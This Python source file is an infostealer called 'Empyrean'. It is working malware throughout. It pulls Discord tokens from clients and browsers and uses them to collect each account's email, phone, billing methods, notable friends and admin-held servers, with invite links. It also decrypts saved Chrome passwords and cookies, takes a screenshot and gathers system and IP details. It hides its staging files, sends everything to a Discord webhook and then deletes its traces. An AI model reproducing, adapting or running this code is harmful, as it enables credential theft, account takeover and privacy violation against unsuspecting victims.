import base64
import json
import os
import platform
import re
import shutil
import socket
import sqlite3
import uuid

import requests
import wmi 
from Crypto.Cipher import AES
from discord import Embed, File, RequestsWebhookAdapter, Webhook
from PIL import ImageGrab
from win32api import SetFileAttributes
from win32con import FILE_ATTRIBUTE_HIDDEN
from win32crypt import CryptUnprotectData

# Config

webhook = "WEBHOOK_URL"

# Config 

def main(webhook: str) -> None: 
    webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
    embed = Embed(title="Empyrean", color=0x000000)
    
    token_grabber(embed=embed)
    embed.add_field(name="**System Info**", value=f"```{systemspec.sys_spec()}```")
    
    google().grabPassword()
    google().grabCookies()
    image()
    
    files = []
    files.append(File(".\\chrome-passwords.txt") if os.path.exists(".\\chrome-passwords.txt") else None)
    files.append(File(".\\chrome-cookies.txt") if os.path.exists(".\\chrome-cookies.txt") else None)
    files.append(File(".\\screenshot.png") if os.path.exists(".\\screenshot.png") else None)
    
    webhook.send(embed=embed, files=files if files != [] else None, username="Empyrean", avatar_url="https://i.imgur.com/ihzoAWl.jpeg")
    cleanup()
    
class token_grabber():
    def __init__(self, embed) -> None:
        global tokens
        
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"

        self.tokens = []
        self.ids = []
        
        self.grabTokens()
        self.embed_accounts(embed)
    
    def embed_accounts(self, embed) -> None:
        for token in self.tokens:
            r = requests.get("https://discordapp.com/api/v6/users/@me", headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token,
            })

            username = r.json()['username'] + '#' + r.json()['discriminator']
            user_id = r.json()['id']
            email = r.json()['email']
            phone = r.json()['phone']
            
            emoji_staff = "<:staff:968704541946167357>"
            emoji_partner = "<:partner:968704542021652560>"
            emoji_hypesquad_event = "<:hypersquad_events:968704541774192693>"
            emoji_green_bughunter = "<:bug_hunter_1:968704541677723648>"
            emoji_hypesquad_bravery = "<:hypersquad_1:968704541501571133>"
            emoji_hypesquad_brilliance = "<:hypersquad_2:968704541883261018>"
            emoji_hypesquad_balance = "<:hypersquad_3:968704541874860082>"
            emoji_early_supporter = "<:early_supporter:968704542126510090>"
            emoji_gold_bughunter = "<:bug_hunter_2:968704541774217246>"
            emoji_verified_bot_developer = "<:verified_dev:968704541702905886>"  
   
            badges = ""
            flags = r.json()['public_flags']
            if (flags == 1): badges += f"{emoji_staff}, "
            if (flags == 2): badges += f"{emoji_partner}, "
            if (flags == 4): badges += f"{emoji_hypesquad_event}, "
            if (flags == 8): badges += f"{emoji_green_bughunter}, "
            if (flags == 64): badges += f"{emoji_hypesquad_bravery}, "
            if (flags == 128): badges += f"{emoji_hypesquad_brilliance}, "
            if (flags == 256): badges += f"{emoji_hypesquad_balance}, "
            if (flags == 512): badges += f"{emoji_early_supporter}, "
            if (flags == 16384): badges += f"{emoji_gold_bughunter}, "
            if (flags == 131072): badges += f"{emoji_verified_bot_developer}, "
            if (badges == ""): badges = "`None`"
            if badges.endswith(", "): badges = badges[:-2]   

            try:
                if r.json()['premium_type'] == 1:
                    nitro = 'Nitro Classic'
                elif r.json()['premium_type'] == 2:
                    nitro = 'Nitro Boost'
            except KeyError:
                nitro = 'None'

            b = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token,
            })
            
            if b.json() == []:
                methods = "`None`"
            else:
                methods = ""
                for method in b.json():
                    if method['type'] == 1:
                        methods += "💳"
                    elif method['type'] == 0:
                        methods += "<:paypal:973417655627288666>"
                    else:
                        methods += "❓"

            f = requests.get("https://discordapp.com/api/v6/users/@me/relationships", headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token,
            })
   
            hq_friends = ""
            for friend in f.json():
                prefered_flags = [1, 2 ,4, 8, 512, 16384, 131072]
                if friend['user']['public_flags'] in prefered_flags:
                    hq_badges = ""
                    flags = friend['user']['public_flags']
                    if (flags == 1): hq_badges += f"{emoji_staff}, "
                    if (flags == 2): hq_badges += f"{emoji_partner}, "
                    if (flags == 4): hq_badges += f"{emoji_hypesquad_event}, "
                    if (flags == 8): hq_badges += f"{emoji_green_bughunter}, "
                    if (flags == 512): hq_badges += f"{emoji_early_supporter}, "
                    if (flags == 16384): hq_badges += f"{emoji_gold_bughunter}, "
                    if (flags == 131072): hq_badges += f"{emoji_verified_bot_developer}, "
                    if hq_badges.endswith(", "): hq_badges = hq_badges[:-2]
     
                    hq_friends += f"{hq_badges} - `{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})`\n"

            g = requests.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token,
            })
            
            hq_guilds = ""
            for guild in g.json():
                admin = True if guild['permissions'] == '4398046511103' else False
                if admin and guild['approximate_member_count'] >= 50:
                    i = requests.get(f"https://discord.com/api/v9/guilds/{guild['id']}/invites", headers={
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                        'Content-Type': 'application/json',
                        'Authorization': token,
                    })
                    
                    invite = i.json()[0]['code']
                    if guild['owner']:
                        owner = " ✅ "
                    else:
                        owner = "❌"
                        
                    hq_guilds += f"\u200b\n**{guild['name']} / ({guild['id']})** \n Owner: `{owner}` | Admin: ` ✅ ` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join {guild['name']}](https://discord.com/invite/{invite})\n"
                
                
            
            embed.add_field(name=f"**{username} ({user_id})**", value=f"```{token}```\n***Email >*** `{email}`\n***Phone >*** `{phone}`\n***Nitro >*** `{nitro}`\n***Billing >*** {methods}\n***Badges >*** {badges}\n\u200b", inline=False)
            
            if hq_friends != "":
                embed.add_field(name="***HQ Friends >***", value=f"{hq_friends}\n\u200b", inline=False)
                
            if hq_guilds != "":
                embed.add_field(name="***HQ Guilds >***", value=f"{hq_guilds}\n\u200b", inline=False)
       
    def decrypt_val(self, buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"
    
    def get_master_key(self, path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming+f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(
                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{disc}\\Local State'))
                                try:
                                    r = requests.get(self.baseurl, headers={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': token,
                                    })
                                except Exception:
                                    pass
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token,
                                })
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token,
                                })
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)
  
class google():
    def get_master_key(self, path) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Chrome < 80"
    
    def grabPassword(self):
        if os.path.exists('.\\chrome-passwords.txt'):
            os.remove('.\\chrome-passwords.txt')
        
        with open('.\\chrome-passwords.txt', 'w') as f:
            f.write('Empyrean /// Google Chrome Passwords\n\n\n')
            hide('chrome-passwords.txt')
            
        appdata = os.getenv("localappdata")
  
        if not os.path.exists(appdata+'\\Google'):
            return []
  
        passwords = []
        master_key = self.get_master_key(appdata+'\\Google\\Chrome\\User Data\\Local State')
        
        login_dbs = [
            appdata + '\\Google\\Chrome\\User Data\\Default\\Login Data',
            appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Login Data',
            appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Login Data',
            appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Login Data',
            appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Login Data',
            appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Login Data',
        ]      
            
        used_login_dbs = []
        
        for login_db in login_dbs:
            if not os.path.exists(login_db):
                continue
            
            used_login_dbs.append(login_db)
            
            try:
                shutil.copy2(login_db, "Loginvault.db")
            except FileNotFoundError:
                pass
            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                with open('.\\chrome-passwords.txt', 'a') as f:
                    for r in cursor.fetchall():
                        url = r[0]
                        username = r[1]
                        encrypted_password = r[2]
                        decrypted_password = self.decrypt_password(encrypted_password, master_key)
                        if url != "" and username != "" and decrypted_password != "":
                            f.write(f'URL: {url}\nUser: {username}\nPassword: {decrypted_password}\n\n')
            except:
                pass
            cursor.close()
            conn.close()
            try:
                os.remove("Loginvault.db")
            except:
                pass
        
        return passwords

    def grabCookies(self):
        if os.path.exists('.\\chrome-cookies.txt'):
            os.remove('.\\chrome-cookies.txt')
        
        with open('.\\chrome-cookies.txt', 'w') as f:
            f.write('Empyrean /// Google Chrome cookies\n\n\n')
            hide('chrome-cookies.txt')
            
        appdata = os.getenv("localappdata")
  
        if not os.path.exists(appdata+'\\Google'):
            return []

        cookies = []
        master_key = self.get_master_key(appdata+'\\Google\\Chrome\\User Data\\Local State')
        
        login_dbs = [
            appdata + '\\Google\\Chrome\\User Data\\Default\\Network\\cookies',
            appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\cookies',
            appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\cookies',
            appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\cookies',
            appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\cookies',
            appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\cookies',
        ] 
        
        used_login_dbs = []
        
        for login_db in login_dbs:
            if not os.path.exists(login_db):
                continue
            
            used_login_dbs.append(login_db)
            
            try:
                shutil.copy2(login_db, "Loginvault.db")
            except FileNotFoundError:
                pass
            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            try:
                cursor.execute("SELECT host_key, name, encrypted_value from cookies")
                with open('.\\chrome-cookies.txt', 'a') as f:
                    for r in cursor.fetchall():
                        host = r[0]
                        user = r[1]
                        decrypted_cookie = self.decrypt_password(r[2], master_key)
                        if host != "":
                            f.write(f'Host: {host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n')
        
            except:
                pass
            cursor.close()
            conn.close()
            try:
                os.remove("Loginvault.db")
            except:
                pass	

        return cookies

class systemspec():
	def sys_spec():
		sys_spec = f"""
Operating System: {systemspec.platform_info()[0]}
Release: {systemspec.platform_info()[1]}
Version: {systemspec.platform_info()[2]}
Architecture: {systemspec.platform_info()[3]}
Hostname: {systemspec.platform_info()[4]}

IP Address: {systemspec.network_info()[0]}
Mac Address: {systemspec.network_info()[1]}

CPU: {systemspec.system_specs()[0].Name}
GPU: {systemspec.system_specs()[1].Name}
RAM: {round(systemspec.system_specs()[2], 0)} GB
"""
		return sys_spec

	def platform_info():
		operating_sys = platform.system()
		os_release = platform.release()
		os_version = platform.version()
		architecture = platform.architecture()
		hostname = socket.gethostname()
		
		return operating_sys, os_release, os_version, architecture, hostname
	
	def network_info():
		ip_address = requests.get('https://api.ipify.org').text
		mac_address = ':'.join(re.findall('..', '%012x' % uuid.getnode()))

		return ip_address, mac_address
	
	def system_specs():
		cpu = wmi.WMI().Win32_Processor()[0]
		gpu = wmi.WMI().Win32_VideoController()[0]
		ram = float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576
		
		return cpu, gpu, ram

def image():
    os.remove('.\\screenshot.png') if os.path.exists('.\\screenshot.png') else None
    ImageGrab.grab().save('.\\screenshot.png', 'PNG')
    hide('screenshot.png')
    
def hide(file):
    SetFileAttributes(file, FILE_ATTRIBUTE_HIDDEN)

def cleanup():
    possible_files = [
        '.\\chrome-passwords.txt',
        '.\\chrome-cookies.txt',
        '.\\screenshot.png'
    ]
    for file in possible_files:
        if os.path.exists(file):
            os.remove(file)
 
if __name__ == "__main__":
    cleanup()
    main(webhook)
